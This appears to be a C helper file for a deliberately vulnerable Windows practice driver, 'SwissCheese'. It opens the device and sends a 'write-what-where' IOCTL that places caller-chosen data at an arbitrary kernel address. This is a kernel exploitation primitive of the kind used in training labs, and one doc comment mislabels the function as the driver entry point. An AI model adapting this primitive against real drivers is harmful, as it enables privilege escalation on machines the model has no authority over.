#include <windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <memory.h>

#define DEVICE_TYPE_SWISSCHEESE		0xdead
#define DEVICE_NAME_SWISSCHEESE		"\\\\.\\SwissCheese"

#define IOCTL_WRITEWHATWHERE        CTL_CODE(DEVICE_TYPE_SWISSCHEESE, 0x800, METHOD_BUFFERED, FILE_ALL_ACCESS)

EXTERN_C
HANDLE
OpenDevice();

EXTERN_C
BOOL
WriteWhatWhere(
	HANDLE hDevice, 
	PVOID pAddress, 
	PUCHAR pData, 
	DWORD dwSize);

/// <summary>
/// Open Device Instance
/// </summary>
/// <returns>HANDLE</returns>

HANDLE
OpenDevice()
{
	HANDLE hDevice;

	if ((hDevice = CreateFile(
						DEVICE_NAME_SWISSCHEESE,
						GENERIC_READ | GENERIC_WRITE,
						0,
						0,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						0)) == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateFile(%s) failed: %08x\n", DEVICE_NAME_SWISSCHEESE, GetLastError());
	}

	return hDevice;
}//OpenDevice()

/// <summary>
/// Driver Entry Point
/// </summary>
/// <param name="hDevice">device handle from OpenDevice()</param>
/// <param name="pAddress">where: the target kernel address</param>
/// <param name="pData">what: data buffer </param>
/// <param name="dwSize">the size of the data buffer</param>
/// <returns>BOOL</returns>

BOOL
WriteWhatWhere(
	HANDLE hDevice, 
	PVOID pAddress, 
	PUCHAR pData, 
	DWORD dwSize)
{
	DWORD dwByteReturned = 0;

	//allocate transfer buffer
	PUCHAR pInputBuffer;
	DWORD dwBufferSize = sizeof(PVOID) + dwSize;

	pInputBuffer = (PUCHAR)malloc(dwBufferSize);
	if (!pInputBuffer)
	{
		printf("[-] malloc(%u) failed\n", dwBufferSize);
		return FALSE;
	}

	//copy the target address to the beginning of the buffer
	memcpy(pInputBuffer, &pAddress, sizeof(PVOID));
	//copy the data to the rest of the buffer
	memcpy(pInputBuffer + sizeof(PVOID), pData, dwSize);

	//sending up to device
	if (!DeviceIoControl(
			hDevice,
			(DWORD)IOCTL_WRITEWHATWHERE,
			pInputBuffer,
			dwBufferSize,
			0,
			0,
			&dwByteReturned,
			NULL))
	{
		printf("[-] DeviceIoControl(IOCTL_WRITEWHATWHERE) failed: %08x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}//WriteWhatWhere()